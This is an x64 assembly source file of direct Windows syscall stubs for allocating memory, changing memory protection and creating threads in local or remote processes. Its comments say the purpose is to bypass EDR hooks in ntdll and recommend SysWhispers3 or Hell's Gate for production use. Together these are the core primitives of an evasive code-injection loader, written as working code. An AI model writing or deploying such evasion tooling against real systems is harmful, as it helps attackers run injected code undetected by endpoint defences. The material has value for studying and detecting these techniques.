; syscall_stub.asm
; =================
; Direct Syscall Stubs for Windows x64
;
; Each stub does exactly what ntdll.dll would do,
; but without going through it (and therefore without triggering EDR hooks).
;
; The Windows x64 syscall convention:
;   1. Move RCX to R10 (the kernel expects the 1st arg in R10, not RCX)
;   2. Place the SSN (System Service Number) in EAX
;   3. Execute the "syscall" instruction (Ring 3 -> Ring 0 transition)
;   4. Return (ret) - the result is in EAX (NTSTATUS)
;
; IMPORTANT: The SSNs below are for Windows 10 21H2 x64.
; They CHANGE between Windows versions. In production, use
; SysWhispers3 or Hell's Gate to resolve dynamically.
;
; Assemble with: ml64 /c syscall_stub.asm

.code

; ---------------------------------------------------------------
; SyscallNtAllocateVirtualMemory
; SSN = 0x18 (Win10 21H2)
;
; Allocates virtual memory in the specified process.
; Equivalent to VirtualAlloc/VirtualAllocEx but at kernel level.
; ---------------------------------------------------------------
SyscallNtAllocateVirtualMemory PROC
    mov r10, rcx        ; r10 = first argument (ProcessHandle)
                        ; rcx is "sacrificed" by the syscall instruction
    mov eax, 18h        ; EAX = System Service Number
    syscall             ; CPU transitions to Ring 0, executes the function
    ret                 ; returns to our code with result in EAX
SyscallNtAllocateVirtualMemory ENDP


; ---------------------------------------------------------------
; SyscallNtProtectVirtualMemory
; SSN = 0x50 (Win10 21H2)
;
; Changes the permissions (RW, RX, RWX, etc) of a memory region.
; Equivalent to VirtualProtect.
; ---------------------------------------------------------------
SyscallNtProtectVirtualMemory PROC
    mov r10, rcx
    mov eax, 50h
    syscall
    ret
SyscallNtProtectVirtualMemory ENDP


; ---------------------------------------------------------------
; SyscallNtCreateThreadEx
; SSN = 0xC7 (Win10 21H2)
;
; Creates a thread in any process (local or remote).
; More powerful version than CreateThread/CreateRemoteThread.
; ---------------------------------------------------------------
SyscallNtCreateThreadEx PROC
    mov r10, rcx
    mov eax, 0C7h
    syscall
    ret
SyscallNtCreateThreadEx ENDP

end
